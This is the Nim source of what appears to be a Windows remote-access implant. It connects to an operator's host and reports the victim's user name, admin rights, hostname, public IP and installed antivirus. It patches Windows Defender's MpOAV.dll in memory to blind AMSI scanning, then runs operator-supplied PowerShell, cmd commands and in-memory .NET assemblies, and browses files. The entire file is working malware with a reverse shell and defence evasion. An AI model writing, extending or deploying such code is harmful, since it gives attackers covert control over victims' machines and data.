import net
import base64
import winim/lean
import winim/inc/lm
import os, sequtils
import std/osproc
import strutils
import strenc
import strformat
import winim/clr
import winim/com
import nativesockets
import httpclient
import shlex
import byteutils
import sugar
import terminaltables
from times import format






let ip = "INPUT_IP"
let patch_port = "INPUT_PORT"
var port = parseInt(patch_port)


var client: net.Socket = newSocket()
client.connect(ip,  Port(port))



proc inbound_comm(): string =
  var receivedMessage: string = client.recvLine()
  
  return receivedMessage
  

var identifier = "AUTH_KEY" 
client.send(encode(identifier)) 
os.sleep(3000)

var buffer = newString(UNLEN + 1)
var cb = DWORD buffer.len
GetUserNameA(&buffer, &cb)
buffer.setLen(cb - 1) 

client.send(encode(buffer))

os.sleep(2000)

if os.isAdmin() == false:
  client.send(encode("0"))
else:
  client.send(encode("1"))




os.sleep(5000)
client.send(encode(hostOS))

os.sleep(2000)

var hostname = getHostname()
client.send(encode(hostname))

os.sleep(2000)

const source = "http://ipv4.icanhazip.com" 

var h_client = newHttpClient()
let response = h_client.getContent(source)
var result = response.strip()
client.send(encode(result))


when defined amd64:
    
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]


proc getAv*() : string =
    let wmisec = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2")
    for avprod in wmisec.execQuery("SELECT displayName FROM AntiVirusProduct\n"):
        result.add($avprod.displayName & "\n")
    result = result.strip(trailing = true)

proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false
 
    let filesInPath = toSeq(walkDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\", relative=true))
    var length = len(filesInPath)
    
    amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
    if amsi == 0:
        
        return disabled
    cs = GetProcAddress(amsi,"DllGetClassObject")
    if cs == nil:
        
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

when isMainModule:
    var success = PatchAmsi()
    
    
    

while true:
  var message = inbound_comm()
  

  if message == "exit":
    client.close()
    break
  elif message == "background":
    discard
  elif message == "persist":
    discard
  elif message == "help":
    discard(message)
    let b64M = encode("[+] Help menu fetched..").len
    client.send($b64M)
    sleep(1000)
    client.send(encode("[+] Help menu fetched.."))
  elif message == "GetAV":
    var result = getAv()
    let b64AV = encode(result).len
    client.send($b64AV)
    sleep(1000)
    client.send(encode(result))
  elif message.split(" ")[0] == "pwsh":
    var params: string = "" 
    var paramsList = message.split(" ")[1 .. ^1]
    params = paramsList.join(" ")
    

    var ress = ""
    var Automation = load("System.Management.Automation")
    var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")

    var runspace = @RunspaceFactory.CreateRunspace()

    runspace.Open()

    var pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(params)
    pipeline.Commands.Add("Out-String")

    var results = pipeline.Invoke()

    for i in countUp(0,results.Count()-1):  
      ress.add($results.Item(i))
      let b64Size = encode(ress).len
      client.send($b64Size)
      sleep(1000)
      client.send(encode(ress))
      
      
      
    runspace.Close() 
  
  elif message.split(" ")[0] == "execute-ASM":
    var params: string = "" 
    var paramsList = message.split(" ")[2 .. ^1]
    params = paramsList.join(" ")
    
    message = inbound_comm()
    sleep(3000)
    var sizeData = client.recvLine()
    let size = parseInt(sizeData)

    var message: string = ""
    while message.len < size:
        message.add(client.recv(size - message.len))

    let payloadStr:string=message

    let payloadParts=payloadStr.split(",")
    var buf:seq[byte] 

    
    for i in payloadParts:
        buf.add(hexToSeqByte(i))
  
      
    var assembly = load(buf)

       
    dump assembly
    var arr = toCLRVariant(shlex(params).words, VT_BSTR) 

    let
        mscor = load("mscorlib")
        io = load("System.IO")
        Console = mscor.GetType("System.Console")
        StringWriter = io.GetType("System.IO.StringWriter")
    
        
    var sw = @StringWriter.new()
    var oldConsOut = @Console.Out
    @Console.SetOut(sw)

    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

    var res = fromCLRVariant[string](sw.ToString())
    let b64Size = encode(res).len
    sleep(1000)
    client.send($b64Size & "\n")
    sleep(1000)
    client.send(encode(res)& "\n")
    
    @Console.SetOut(oldConsOut)

  elif message.split(" ")[0] == "ls":
    var args = message.split(" ")[1 .. ^1]  
    var argString = args.join(" ")
    var path : string = argString
    if path == "":
      path = getCurrentDir()
    else:
      path = path

    var dateTimeFormat : string = "dd-MM-yyyy H:mm:ss"

    let t2 = newUnicodeTable()
    t2.separateRows = false
    t2.setHeaders(@[newCell("Name", pad=5), newCell("Size", rightpad=10), newCell("Last Modified", pad=2)])

    for kind, path in walkDir(path):
      case kind:
      of pcFile:
        var fileName: string = "" 
        var namelist = path.split("\\")
        fileName = namelist.join(" ")
        var size = getFileSize(path)
        var lastaccess = getLastModificationTime(path)


        for fileIndex in namelist:
            if fileIndex == namelist[^1]:
                #echo fileIndex
                t2.addRow(@["--F-- "&fileIndex, $size, $lastaccess.format(dateTimeFormat)])
      of pcDir:
        var dirlist = path.split("\\")
        var lastaccess = getLastModificationTime(path)

        for fileIndex in dirlist:
            if fileIndex == dirlist[^1]:
                #echo fileIndex
                t2.addRow(@["--D-- "&fileIndex, "N/A", $lastaccess.format(dateTimeFormat)])
      of pcLinkToFile:
        echo "Link to file: ", path
      of pcLinkToDir:
        echo "Link to dir: ", path
    var OKmsg = fmt"[+] Listing directory: {path}"
    let b64Size = encode(OKmsg&"\n" & render(t2)).len
    sleep(1000)
    client.send($b64Size & "\n")
    sleep(1000)
    client.send(encode(OKmsg&"\n" & render(t2))& "\n")
  
  elif message.split(" ")[0] == "cd":
    var args = message.split(" ")[1 .. ^1]  
    var argString = args.join(" ")
    var dir : string = argString
    if dir == "":
      var errmsg: string = "[-] Invalid argument, please supply at least one directory..."
      let b64Size = encode(errmsg).len
      sleep(1000)
      client.send($b64Size & "\n")
      sleep(1000)
      client.send(encode(errmsg)& "\n")
    else:
      setCurrentDir(dir)
      var OKmsg: string = fmt"[+] Changed working directory to: {dir}"
      let b64Size = encode(OKmsg).len
      sleep(1000)
      client.send($b64Size & "\n")
      sleep(1000)
      client.send(encode(OKmsg)& "\n")
  elif message.split(" ")[0] == "pwd":
    var currentDIR = getCurrentDir()
    var OKmsgDIR: string = fmt"[+] Current working directory: {currentDIR}"
    let b64SizePWD = encode(OKmsgDIR).len
    client.send($b64SizePWD)
    sleep(1000)
    client.send(encode(OKmsgDIR))

  elif message.split(" ")[0] == "shell":
    var command = message.split(" ")[1 .. ^1]
    var commandString = command.join(" ")
    var result = execProcess("cm" & "d /c " & commandString,options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
    let b64SizePWSH = encode(result).len
    client.send($b64SizePWSH)
    sleep(1000)
    client.send(encode(result))    

  else:
    try:
      var data: int = 0*1024
      client.send($data)

    except OSError:
      var errmsg: string = "The command was not found on the system"
      let b64SizeElse_err = encode(errmsg).len
      client.send($b64SizeElse_err)
      sleep(1000)
      client.send(encode(errmsg))
client.close()